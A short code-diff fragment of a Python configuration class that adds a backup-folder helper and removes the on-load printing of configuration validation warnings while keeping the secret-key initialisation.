+    def get_backup_folder(cls):
+        """Get backup folder path"""
+        cls.BACKUP_DIR.mkdir(parents=True, exist_ok=True)
+        return str(cls.BACKUP_DIR)
 
-# Initialize configuration on module load
-# Resolve SECRET_KEY after class creation
+# Initialize the secret key after class definition
 Config.SECRET_KEY = Config.ensure_secret_key()
-_validation_errors = Config.validate()
-if _validation_errors:
-    print("⚠️  Configuration warnings:")
-    for error in _validation_errors:
-        print(f"   - {error}")
